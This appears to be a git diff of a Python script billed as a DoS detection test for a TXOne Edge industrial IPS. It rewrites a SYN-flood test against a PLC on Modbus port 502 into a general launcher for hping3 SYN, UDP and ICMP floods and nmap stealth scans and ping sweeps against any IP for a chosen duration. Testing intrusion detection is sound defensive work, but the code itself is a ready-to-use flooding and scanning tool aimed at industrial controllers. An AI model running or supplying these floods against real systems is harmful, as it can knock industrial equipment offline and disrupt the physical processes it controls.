@@ -1,66 +1,60 @@
+#!/usr/bin/env python3
+
+import argparse
 import subprocess
-import time
-import os
-import signal
 import sys
 
-def log(msg):
-    print(f"[+] {msg}")
+def run_attack(attack_type, target_ip, duration):
+    print(f"[+] Running attack: {attack_type} on {target_ip} for {duration} seconds...")
 
-def ping_device(plc_ip, count=4):
     try:
-        result = subprocess.run(["ping", "-c", str(count), plc_ip],
-                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        if result.returncode == 0:
-            log("Ping successful. OT device is responsive.")
+        if attack_type == "syn-flood":
+            cmd = ["hping3", "-S", target_ip, "-p", "502", "--flood"]
+        elif attack_type == "udp-flood":
+            cmd = ["hping3", "--udp", "-p", "502", "--flood", target_ip]
+        elif attack_type == "icmp-flood":
+            cmd = ["hping3", "--icmp", "--flood", target_ip]
+        elif attack_type == "tcp-scan-syn":
+            cmd = ["nmap", "-sS", "-p-", target_ip]
+        elif attack_type == "tcp-scan-null":
+            cmd = ["nmap", "-sN", target_ip]
+        elif attack_type == "tcp-scan-xmas":
+            cmd = ["nmap", "-sX", target_ip]
+        elif attack_type == "ping-sweep":
+            cmd = ["nmap", "-sn", target_ip + "/24"]
         else:
-            log("Ping failed or partially successful. Possible disruption.")
-        print(result.stdout)
+            print(f"[!] Unsupported attack type: {attack_type}")
+            sys.exit(1)
+
+        print(f"[+] Running command: {' '.join(cmd)}")
+        proc = subprocess.Popen(cmd)
+
+        proc.wait(timeout=int(duration))
+        proc.terminate()
+
+    except subprocess.TimeoutExpired:
+        print("[*] Attack duration complete. Terminating process.")
+        proc.terminate()
+    except KeyboardInterrupt:
+        print("[!] Attack interrupted by user.")
+        proc.terminate()
     except Exception as e:
-        log(f"Error pinging device: {e}")
-
-def launch_dos_attack(plc_ip):
-    log(f"Launching SYN flood attack to {plc_ip} on port 502...")
-    attack_cmd = ["hping3", "-S", plc_ip, "-p", "502", "--flood"]
-    process = subprocess.Popen(attack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
-    return process
-
-def stop_dos_attack(process):
-    log("Stopping DoS attack...")
-    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
-
-def main():
-    if len(sys.argv) != 3:
-        print("Usage: python3 test-dos-detection.py <PLC-IP> <Duration-in-seconds>")
-        sys.exit(1)
-
-    plc_ip = sys.argv[1]
-    try:
-        attack_duration = int(sys.argv[2])
-    except ValueError:
-        print("Error: Duration must be an integer (seconds).")
-        sys.exit(1)
-
-    log("== TXOne Edge IPS DoS Detection Test ==")
-
-    log("Step 1: Baseline connectivity check")
-    ping_device(plc_ip)
-
-    log("Step 2: Start DoS attack")
-    attack_process = launch_dos_attack(plc_ip)
-    time.sleep(attack_duration)
-
-    log("Step 3: Check OT device status during attack")
-    ping_device(plc_ip)
-
-    stop_dos_attack(attack_process)
-    time.sleep(5)
-
-    log("Step 4: Check OT device status after attack")
-    ping_device(plc_ip)
-
-    log("== End of Test ==")
-    log("Please check the IPS dashboard for alerts, blocked IPs, and logs.")
+        print(f"[!] Error: {e}")
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(
+        description="TXOne Edge IPS DoS Test Script",
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter
+    )
+    parser.add_argument("attack_type", 
+                        help="Type of DoS attack. Available options: "
+                             "syn-flood, udp-flood, icmp-flood, "
+                             "tcp-scan-syn, tcp-scan-null, "
+                             "tcp-scan-xmas, ping-sweep")
+    parser.add_argument("target_ip", help="Target IP address")
+    parser.add_argument("duration", help="Duration to run the attack (in seconds)")
+    
+    # Show options if user runs -h or --help
+    args = parser.parse_args()
+
+    run_attack(args.attack_type, args.target_ip, args.duration)
